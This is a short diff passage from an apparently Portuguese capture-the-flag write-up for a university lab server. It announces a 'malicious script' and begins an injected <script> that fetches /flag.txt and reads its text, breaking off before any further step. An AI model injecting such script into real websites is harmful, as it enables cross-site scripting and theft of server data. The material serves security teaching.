@@ -24,6 +24,8 @@ http://ctf-fsi.fe.up.pt:5007/?k304=y
 
 Vamos, então, construir o script malicioso:
 
+
+
 \<script\>  
 fetch('/flag.txt')  
 .then(response \=\>response.text())  
